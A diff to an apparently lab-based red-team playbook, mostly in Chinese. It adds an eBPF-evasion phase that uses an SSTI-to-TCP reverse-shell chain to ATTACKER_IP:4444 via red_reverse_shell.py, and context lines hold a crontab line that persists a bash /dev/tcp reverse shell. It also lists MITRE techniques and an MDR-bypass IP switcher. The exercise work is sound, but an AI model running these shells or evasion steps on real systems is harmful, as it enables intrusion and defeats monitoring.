@@ -78,7 +78,40 @@ id
 (crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/<WSL2_IP>/4444 0>&1'") | crontab -
 ```
 
-### Phase 5: Exfiltration (資料外傳)
+### Phase 5: Evasion — eBPF v1 Bypass (繞過防禦)
+
+**場景**：藍軍已啟動 eBPF v1，memfd_create 攻擊被攔截。
+**策略**：改用不經過 memfd_create 的 TCP 反向 Shell。
+
+```bash
+# 攻擊機: 啟動 reverse shell listener + payload 產生器
+python3 red_reverse_shell.py -t <TARGET_IP> -l <ATTACKER_IP>
+
+# 另一終端: 貼上輸出的 curl 指令
+curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=..."
+```
+
+**繞過原理：**
+
+| eBPF v1 Hook | 我們是否觸發 | 為什麼 |
+|--------------|-------------|--------|
+| `memfd_create` | ❌ 不觸發 | 不用 memfd，直接 fork |
+| `execve /proc/fd` | ❌ 不觸發 | 不從 /proc/fd 執行 |
+| `socket(SOCK_RAW)` | ❌ 不觸發 | 用 SOCK_STREAM (TCP) |
+
+**攻擊鏈：**
+```
+SSTI → os.popen → base64 -d → python3 → fork()
+  └→ child: socket(SOCK_STREAM) → connect(ATTACKER_IP:4444)
+       → dup2(sock, 0) → dup2(sock, 1) → dup2(sock, 2)
+       → pty.spawn("/bin/bash") → interactive shell
+```
+
+**注意**：此攻擊不需要 sudo（用 TCP 不用 ICMP raw socket）
+
+---
+
+### Phase 5b: Exfiltration (資料外傳)
 
 ```bash
 # 攻擊機: 啟動接收器
@@ -134,6 +167,8 @@ exit
 
 | Defense Evasion | T1070.004 | File Deletion | exfil_agent 自刪 |
 | Defense Evasion | T1070.003 | Clear Command History | history -c |
+| Command & Control | T1071.001 | Application Layer Protocol (TCP) | reverse shell bypass |
+| Defense Evasion | — | eBPF v1 Bypass | 避開 memfd/ICMP hook |
 
 **刻意排除：** Privilege Escalation、Impact (控制爆炸半徑)
 
@@ -152,6 +187,7 @@ exit
 | exfil_agent.py | 靶機端自動蒐集 + 外傳 agent |
 | deploy_agent.sh | 一鍵生成 agent 部署指令 |
 | ip_switch.sh | IP alias 管理 (繞過 MDR) |
+| red_reverse_shell.py | TCP 反向 Shell (繞過 eBPF v1) |
 
 ---
 
